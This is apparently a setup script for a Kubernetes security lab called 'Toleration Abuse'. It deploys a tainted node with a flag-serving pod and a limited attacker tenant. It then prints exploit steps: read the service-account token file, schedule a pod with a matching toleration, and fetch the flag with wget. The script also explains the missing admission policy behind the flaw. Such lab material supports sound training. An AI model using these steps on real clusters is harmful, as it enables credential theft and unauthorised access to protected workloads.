#!/bin/bash
set -euo pipefail
K8S_ID="k8s-29"
CLUSTER_NAME="cve-k8s-29-toleration"
source "$(dirname "$0")/../../../scripts/k8s-common.sh"

echo "[K8S-29] Toleration Abuse"
k8s_init
k8s_create_host_flag
k8s_create_cluster
k8s_wait_ready

echo "[*] Tainting one worker node to protect flag pod..."
WORKER_NODES=$(kubectl get nodes -l '!node-role.kubernetes.io/control-plane' -o name)
FIRST_WORKER=$(echo "$WORKER_NODES" | head -1)
kubectl taint "$FIRST_WORKER" protected=true:NoSchedule --overwrite 2>/dev/null || true

k8s_load_images alpine:latest bitnami/kubectl:1.28

k8s_apply << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: vault-ns
---
apiVersion: v1
kind: Pod
metadata:
  name: vault-pod
  namespace: vault-ns
  labels:
    app: vault
spec:
  tolerations:
    - key: "protected"
      operator: "Equal"
      value: "true"
      effect: "NoSchedule"
  containers:
    - name: vault
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["/bin/sh", "-c"]
      args:
        - "mkdir -p /vault && echo flag > /vault/flag.txt && while true; do printf 'HTTP/1.1 200 OK\r\n\r\n%s' \"$(cat /vault/flag.txt)\" | nc -l -p 8080 -w 1; done"
      ports:
        - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: vault-svc
  namespace: vault-ns
spec:
  selector:
    app: vault
  ports:
    - port: 8080
---
# Tenant RBAC: attacker-sa can only manage pods inside attacker-ns
apiVersion: v1
kind: Namespace
metadata:
  name: attacker-ns
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attacker-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: attacker-pods
  namespace: attacker-ns
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create", "get", "list", "update", "delete"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: attacker-pods
  namespace: attacker-ns
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attacker-ns
roleRef:
  kind: Role
  name: attacker-pods
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: attacker-ns
  labels:
    app: attacker
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: attacker
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

k8s_wait_pod "vault-pod" "vault-ns"
k8s_wait_pod "attacker-pod" "attacker-ns"
sleep 5

FLAG_IP=$(kubectl get svc vault-svc -n vault-ns -o jsonpath='{.spec.clusterIP}')
kubectl exec -n vault-ns vault-pod -- sh -c "echo '$FLAG' > /vault/flag.txt" 2>/dev/null || true

k8s_info
echo "    Flag in: vault-pod on tainted node"
echo "    Service: vault-svc.vault-ns.svc.cluster.local:8080"
echo ""
echo "    Exploit (attacker is a limited tenant in attacker-ns; use the SA token):"
echo "    TOKEN=\$(kubectl exec -n attacker-ns attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
echo "    kubectl --token=\$TOKEN describe nodes | grep -A1 Taint"
echo "    kubectl --token=\$TOKEN run tolerator --image=alpine -n attacker-ns --overrides='{\"spec\":{\"tolerations\":[{\"key\":\"protected\",\"operator\":\"Equal\",\"value\":\"true\",\"effect\":\"NoSchedule\"}]}}' -- sleep 3600"
echo "    kubectl --token=\$TOKEN exec tolerator -n attacker-ns -- wget -qO- http://${FLAG_IP}:8080"
echo ""
echo "    Note: taints/tolerations are scheduling mechanisms, not security controls."
echo "    The finding is the missing admission policy that would restrict who may"
echo "    add tolerations and schedule onto protected nodes."
